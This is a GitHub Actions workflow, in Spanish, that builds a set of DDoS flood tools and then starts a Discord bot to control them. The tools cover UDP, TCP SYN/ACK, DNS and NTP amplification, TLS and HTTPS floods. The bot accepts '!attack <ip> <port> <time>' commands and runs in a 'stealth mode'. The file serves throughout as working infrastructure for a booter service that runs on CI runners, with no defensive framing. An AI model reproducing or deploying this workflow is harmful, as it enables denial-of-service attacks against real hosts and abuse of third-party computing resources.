name: BotL4&L7

on:
  workflow_dispatch:
  push:
    branches:
      - main

jobs:
  build-and-run:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout repository
        uses: actions/checkout@v4

      - name: Set up Python
        uses: actions/setup-python@v4
        with:
          python-version: '3.11'

      - name: Set up Go
        uses: actions/setup-go@v4
        with:
          go-version: '1.21'

      - name: Install Go dependencies
        run: |
          go mod init bot 2>/dev/null || true
          go get github.com/sandertv/go-raknet 2>/dev/null || true
          go get github.com/sirupsen/logrus 2>/dev/null || true

      - name: Install Python dependencies
        run: |
          python -m pip install --upgrade pip
          pip install -U discord.py

      - name: Install build tools and libraries
        run: |
          sudo apt-get update
          sudo apt-get install -y build-essential gcc g++ make libpcap-dev libssl-dev
          echo "Herramientas instaladas"

      - name: Build ALL binaries
        run: |
          echo "========================================"
          echo "COMPILANDO TODOS LOS M√âTODOS"
          echo "========================================"
          
          # ========== M√âTODOS UDP ==========
          echo ""
          echo "üîß COMPILANDO M√âTODOS UDP:"
          
          # udpbypass.c
          if [ -f "udpbypass.c" ]; then
            echo "  Compilando udpbypass.c ‚Üí udpbypass"
            gcc -O3 -pthread udpbypass.c -o udpbypass 2>/dev/null && {
              chmod +x udpbypass
              echo "    ‚úì udpbypass listo"
            } || echo "    ‚úó Error udpbypass"
          fi
          
          # udp.c (existente)
          if [ -f "udp.c" ]; then
            gcc -O3 -pthread -o udp udp.c 2>/dev/null && {
              chmod +x udp
              echo "    ‚úì udp listo"
            }
          fi
          
          # udphex.c (existente)
          if [ -f "udphex.c" ]; then
            gcc -O3 udphex.c -o udphex 2>/dev/null && {
              chmod +x udphex
              echo "    ‚úì udphex listo"
            }
          fi
          
          # udppps.c (existente)
          if [ -f "udppps.c" ]; then
            gcc -O3 udppps.c -o udppps 2>/dev/null && {
              chmod +x udppps
              echo "    ‚úì udppps listo"
            }
          fi
          
          # ovh.c (existente)
          if [ -f "ovh.c" ]; then
            gcc -O3 -pthread ovh.c -o ovh -lpcap 2>/dev/null && {
              chmod +x ovh
              echo "    ‚úì ovh listo"
            } || {
              # Intentar sin libpcap
              gcc -O3 -pthread ovh.c -o ovh 2>/dev/null && {
                chmod +x ovh
                echo "    ‚úì ovh listo (sin libpcap)"
              } || echo "    ‚úó Error ovh"
            }
          fi
          
          # udppayload.c (existente)
          if [ -f "udppayload.c" ]; then
            gcc -O3 -pthread udppayload.c -o udppayload 2>/dev/null && {
              chmod +x udppayload
              echo "    ‚úì udppayload listo"
            }
          fi
          
          # ========== M√âTODOS TCP ==========
          echo ""
          echo "üîó COMPILANDO M√âTODOS TCP:"
          
          # tcp.c
          if [ -f "tcp.c" ]; then
            echo "  Compilando tcp.c ‚Üí tcp"
            gcc -O3 -pthread tcp.c -o tcp 2>/dev/null && {
              chmod +x tcp
              echo "    ‚úì tcp listo"
            } || echo "    ‚úó Error tcp"
          fi
          
          # tcp-syn.c
          if [ -f "tcp-syn.c" ]; then
            echo "  Compilando tcp-syn.c ‚Üí tcp-syn"
            gcc -O3 -pthread tcp-syn.c -o tcp-syn -lpcap 2>/dev/null && {
              chmod +x tcp-syn
              echo "    ‚úì tcp-syn listo"
            } || {
              gcc -O3 -pthread tcp-syn.c -o tcp-syn 2>/dev/null && {
                chmod +x tcp-syn
                echo "    ‚úì tcp-syn listo (sin libpcap)"
              } || echo "    ‚úó Error tcp-syn"
            }
          fi
          
          # tcp-ack.c
          if [ -f "tcp-ack.c" ]; then
            echo "  Compilando tcp-ack.c ‚Üí tcp-ack"
            gcc -O3 -pthread tcp-ack.c -o tcp-ack -lpcap 2>/dev/null && {
              chmod +x tcp-ack
              echo "    ‚úì tcp-ack listo"
            } || {
              gcc -O3 -pthread tcp-ack.c -o tcp-ack 2>/dev/null && {
                chmod +x tcp-ack
                echo "    ‚úì tcp-ack listo (sin libpcap)"
              } || echo "    ‚úó Error tcp-ack"
            }
          fi
          
          # tcp-tls.c (necesita OpenSSL)
          if [ -f "tcp-tls.c" ]; then
            echo "  Compilando tcp-tls.c ‚Üí tcp-tls"
            gcc -O3 -pthread tcp-tls.c -o tcp-tls -lssl -lcrypto 2>/dev/null && {
              chmod +x tcp-tls
              echo "    ‚úì tcp-tls listo"
            } || echo "    ‚úó Error tcp-tls (necesita libssl-dev)"
          fi
          
          # ========== M√âTODOS AMP ==========
          echo ""
          echo "‚ö° COMPILANDO M√âTODOS AMP:"
          
          # dns.c (dns-amp)
          if [ -f "dns.c" ]; then
            echo "  Compilando dns.c ‚Üí dns"
            gcc -O3 -pthread dns.c -o dns 2>/dev/null && {
              chmod +x dns
              echo "    ‚úì dns listo"
            } || echo "    ‚úó Error dns"
          fi
          
          # ntp.c (ntp-amp)
          if [ -f "ntp.c" ]; then
            echo "  Compilando ntp.c ‚Üí ntp"
            gcc -O3 -pthread ntp.c -o ntp 2>/dev/null && {
              chmod +x ntp
              echo "    ‚úì ntp listo"
            } || echo "    ‚úó Error ntp"
          fi
          
          # ========== M√âTODOS L7 ==========
          echo ""
          echo "üåê COMPILANDO M√âTODOS L7:"
          
          # httpsraw.c
          if [ -f "httpsraw.c" ]; then
            echo "  Compilando httpsraw.c ‚Üí httpsraw"
            gcc -O3 -pthread httpsraw.c -o httpsraw 2>/dev/null && {
              chmod +x httpsraw
              echo "    ‚úì httpsraw listo"
            } || echo "    ‚úó Error httpsraw"
          fi
          
          # tls.c (tls-flood)
          if [ -f "tls.c" ]; then
            echo "  Compilando tls.c ‚Üí tls"
            gcc -O3 -pthread tls.c -o tls -lssl -lcrypto 2>/dev/null && {
              chmod +x tls
              echo "    ‚úì tls listo"
            } || {
              # Versi√≥n simple sin OpenSSL
              if [ -f "tls-simple.c" ]; then
                gcc -O3 -pthread tls-simple.c -o tls 2>/dev/null && {
                  chmod +x tls
                  echo "    ‚úì tls listo (versi√≥n simple)"
                } || echo "    ‚úó Error tls (ambas versiones fallaron)"
              else
                echo "    ‚úó Error tls (necesita libssl-dev o tls-simple.c)"
              fi
            }
          fi
          
          # httpsrequest.c
          if [ -f "httpsrequest.c" ]; then
            echo "  Compilando httpsrequest.c ‚Üí httpsrequest"
            gcc -O3 -pthread httpsrequest.c -o httpsrequest 2>/dev/null && {
              chmod +x httpsrequest
              echo "    ‚úì httpsrequest listo"
            } || echo "    ‚úó Error httpsrequest"
          fi
          
          # ========== RESULTADO FINAL ==========
          echo ""
          echo "========================================"
          echo "üìä RESUMEN DE COMPILACI√ìN"
          echo "========================================"
          echo "Ejecutables disponibles:"
          
          # Mostrar todos los binarios compilados
          find . -maxdepth 1 -type f -executable ! -name "*.py" ! -name "*.go" ! -name "*.sh" | while read bin; do
            size=$(stat -c%s "$bin" 2>/dev/null || echo "?")
            echo "  ‚úì $(basename "$bin") (${size} bytes)"
          done || echo "  No se compilaron ejecutables"
          
          echo ""
          echo "Scripts Go disponibles:"
          for script in udpflood.go raknet.go; do
            if [ -f "$script" ]; then
              echo "  ‚úì $script"
            fi
          done
          
          echo "========================================"

      - name: Setup bot token
        env:
          KEYS: ${{ secrets.KEYS }}
        run: |
          if [ -z "$KEYS" ]; then
            echo "ERROR: No se configur√≥ el secret KEYS"
            echo "Ve a Settings ‚Üí Secrets and variables ‚Üí Actions"
            echo "Crea un secret llamado 'KEYS' con tu token de Discord"
            exit 1
          fi
          
          echo "$KEYS" > token.txt
          echo "‚úÖ Token configurado desde secret KEYS"

      - name: Run bot
        run: |
          echo "====================================="
          echo "ü§ñ INICIANDO BOT CON TODOS LOS M√âTODOS"
          echo "====================================="
          echo "Categor√≠as disponibles:"
          echo ""
          echo "üì° L4 UDP PROTOCOL:"
          echo "  !attack udp <ip> <puerto> <tiempo>"
          echo "  !attack udphex <ip> <puerto> <tiempo>"
          echo "  !attack udppps <ip> <puerto> <tiempo>"
          echo "  !attack udpflood <ip> <puerto> <tiempo>"
          echo "  !attack ovh <ip> <puerto> <tiempo>"
          echo "  !attack udppayload <ip> <puerto> <tiempo> <payload>"
          echo "  !attack raknet <ip> <puerto> <tiempo>"
          echo "  !attack udpbypass <ip> <puerto> <tiempo>"
          echo ""
          echo "üîó L4 TCP PROTOCOL:"
          echo "  !attack tcp <ip> <puerto> <tiempo>"
          echo "  !attack tcp-syn <ip> <puerto> <tiempo>"
          echo "  !attack tcp-ack <ip> <puerto> <tiempo>"
          echo "  !attack tcp-tls <ip> <puerto> <tiempo>"
          echo ""
          echo "‚ö° AMP METHODS:"
          echo "  !attack dns <ip> <puerto> <tiempo>"
          echo "  !attack ntp <ip> <puerto> <tiempo>"
          echo ""
          echo "üåê L7 METHODS:"
          echo "  !attack httpsraw <ip> <puerto> <tiempo>"
          echo "  !attack tls <ip> <puerto> <tiempo>"
          echo "  !attack httpsrequest <ip> <puerto> <tiempo>"
          echo ""
          echo "üìù Usa: !methods para ver detalles"
          echo "üîá Modo sigiloso: ON (0 mensajes en Discord)"
          echo "====================================="
          echo ""
          
          # Verificar archivos esenciales
          if [ ! -f "bot.py" ]; then
            echo "‚ùå ERROR: bot.py no encontrado"
            exit 1
          fi
          
          if [ ! -f "token.txt" ]; then
            echo "‚ùå ERROR: token.txt no creado"
            exit 1
          fi
          
          echo "‚úÖ Iniciando bot..."
          python bot.py
